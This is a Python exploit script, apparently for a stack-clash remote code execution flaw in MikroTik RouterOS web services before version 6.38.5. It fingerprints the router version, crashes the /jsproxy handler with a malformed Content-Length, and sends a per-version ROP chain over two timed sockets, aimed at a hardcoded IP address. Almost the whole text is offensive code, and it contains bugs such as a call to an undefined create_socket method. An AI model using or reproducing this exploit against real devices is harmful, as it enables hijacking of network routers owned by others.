import requests,socket
from time import sleep
class Vuln():
	long_stack=['6.33', '6.33.1', '6.33.2', '6.33.3', '6.33.5', '6.33.6', '6.34', '6.34.1', '6.34.2', '6.34.3', '6.34.4', '6.34.5', '6.34.6', '6.35', '6.35.1', '6.35.2', '6.35.4', '6.36', '6.36.1', '6.36.2', '6.36.3', '6.36.4', '6.37', '6.37.1', '6.37.2', '6.37.3', '6.37.4', '6.37.5', '6.38', '6.38.1', '6.38.2', '6.38.3', '6.38.4']
	def __init__(self,ip,port=80):
		self.ip=ip
		self.port=port
		self.version=self.get_version()
		self.vulnerable=self.check_vulnerable()
		self.ropChain=self.get_rop()
	def get_version(self):
		resp = requests.get('http://%s:%s'%(self.ip,self.port))
		response = resp.content.decode('utf-8','ignore')
		read_index=response.find('<h1>RouterOS ')
		from_header=response[read_index+14:]
		end_index=from_header.find('</h1>')
		router_version=from_header[:end_index]
		return	router_version
	def check_vulnerable(self):
		#We have to confirm this router version is earlier than 6.38.5
		#Any better logic will be appreciated
		router_version=self.version.replace('.','')#remove decimal points
		router_version=router_version+'0'*(5-len(router_version))#pad to length of 5
		if int(router_version)>63840:
			return False
		return True
	def get_rop(self):
		ropfile=open('x86ropchains','rb').read()
		ropindexes,ropchains=ropfile.split(b'\n\n')
		ropindexes=ropindexes.split(b',')
		if self.version in ropindexes:
			rop_offset=ropindexes.index(bytes(self.version))*932
			ropchain=ropchains[rop_offset:rop_offset+932]
			return ropchain
		else:
			print "I may have skipped that one"
	def create_sockets(self,number):
		sockets=[]
		for i in range(number):
			s = socket.socket()
			s.connect((self.ip, self.port))
			sockets.append(s)
		return sockets
	def send_data(self,s,data):
		s.send(data)
		sleep(0.5)
	def crash(self):
		s = self.create_socket(1)[0]
		self.send_data(s,"POST /jsproxy HTTP/1.1\r\nContent-Length: -1\r\n\r\n")
		self.send_data(s,b'A' * 4096)
		s.close()
		sleep(2.5)
	def exploit(self):
		if self.vulnerable:
			self.crash()
			s1,s2=self.create_sockets(2)
			stack_size=167936 if self.version in long_stack else 8425472
			self.send_data(s1,"POST /jsproxy HTTP/1.1\r\nContent-Length: %s\r\n\r\n"%stack_size)
			self.send_data(s1,b'A'*(4076))
			self.send_data(s2,"POST /jsproxy HTTP/1.1\r\nContent-Length: 32768\r\n\r\n")
			# Its About Time (ʘ‿ʘ)
			self.send_data(s1,self.ropChain)
			s2.close()
		else:
			print "How can I attack a target that is not vulnerable?"
router=Vuln('20.20.20.237')